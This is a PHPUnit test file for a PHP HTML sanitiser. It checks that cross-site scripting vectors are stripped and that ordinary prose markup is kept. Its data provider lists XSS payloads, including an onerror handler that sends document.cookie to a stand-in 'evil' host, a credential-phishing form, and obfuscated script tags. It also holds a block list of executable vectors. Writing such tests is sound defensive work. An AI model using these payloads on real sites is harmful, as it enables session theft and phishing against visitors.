<?php

namespace Tests\Unit;

use App\Support\HtmlSanitiser;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * HtmlSanitiser is the only thing between a content-manager account and
 * script running on every visitor's page — the frontend renders these bodies
 * with dangerouslySetInnerHTML. These tests exist so that widening the
 * allowlist in config/purifier.php can never quietly reopen a hole.
 */
class HtmlSanitiserTest extends TestCase
{
    /** Vectors that must never survive, whatever the input was. */
    private const EXECUTABLE = [
        '<script', '<iframe', '<form', '<svg', '<object', '<embed',
        'javascript:', 'data:text/html',
        'onerror', 'onclick', 'onload', 'onmouseover',
        'style=',
    ];

    public static function attacks(): array
    {
        return [
            'script tag' => ['<p>Hi</p><script>alert(document.cookie)</script>'],
            'onerror attribute' => ['<img src=x onerror="fetch(\'//evil/\'+document.cookie)">'],
            'javascript: href' => ['<a href="javascript:alert(1)">click</a>'],
            'iframe' => ['<p>a</p><iframe src="//evil.example"></iframe>'],
            'onclick attribute' => ['<p onclick="alert(1)">text</p>'],
            'inline style' => ['<p style="position:fixed;top:0">overlay</p>'],
            'svg onload' => ['<svg/onload=alert(1)>'],
            'data URI image' => ['<img src="data:text/html;base64,PHNjcmlwdD4=">'],
            'phishing form' => ['<form action="//evil"><input name="pw"></form>'],
            'nested obfuscation' => ['<p><scr<script>ipt>alert(1)</scr</script>ipt></p>'],
            'uppercase script' => ['<SCRIPT>alert(1)</SCRIPT>'],
            'object embed' => ['<object data="//evil"></object>'],
        ];
    }

    #[DataProvider('attacks')]
    public function test_it_strips_executable_content(string $dirty): void
    {
        $clean = (string) HtmlSanitiser::clean($dirty);

        foreach (self::EXECUTABLE as $vector) {
            $this->assertStringNotContainsStringIgnoringCase(
                $vector,
                $clean,
                "{$vector} survived sanitisation of: {$dirty}"
            );
        }
    }

    public function test_it_keeps_the_markup_prose_styles(): void
    {
        $clean = (string) HtmlSanitiser::clean(
            '<p>A firewall policy is not static.</p>'
            .'<h2>The stale object problem</h2><h3>Detail</h3>'
            .'<ul><li>Audit quarterly</li><li>Prefer <strong>FQDN</strong> objects</li></ul>'
            .'<ol><li>First</li></ol>'
            .'<p>See <a href="https://example.com/doc">the doc</a>, or <em>ask</em>.</p>'
            .'<blockquote>Worth quoting.</blockquote><p><code>iptables -L</code></p>'
            .'<table><thead><tr><th scope="col">Port</th></tr></thead><tbody><tr><td>443</td></tr></tbody></table>'
        );

        foreach (['<h2>', '<h3>', '<ul>', '<ol>', '<li>', '<strong>', '<em>',
            '<blockquote>', '<code>', '<table>', '<th scope="col">', '<td>'] as $kept) {
            $this->assertStringContainsString($kept, $clean);
        }

        $this->assertStringContainsString('href="https://example.com/doc"', $clean);
    }

    /**
     * An emptied editor posts markup, not "". Everything downstream — the
     * reading-time hook, "is this publishable" — should see that as empty.
     */
    public function test_it_normalises_an_emptied_editor_to_null(): void
    {
        $this->assertNull(HtmlSanitiser::clean('<p>&nbsp;</p>'));
        $this->assertNull(HtmlSanitiser::clean('<p></p>'));
        $this->assertNull(HtmlSanitiser::clean('   '));
        $this->assertNull(HtmlSanitiser::clean(''));
        $this->assertNull(HtmlSanitiser::clean(null));
    }

    public function test_it_keeps_an_image_only_body(): void
    {
        $clean = (string) HtmlSanitiser::clean('<p><img src="/storage/media/diagram.png" alt="Rack layout"></p>');

        $this->assertStringContainsString('<img', $clean);
        $this->assertStringContainsString('alt="Rack layout"', $clean);
    }
}
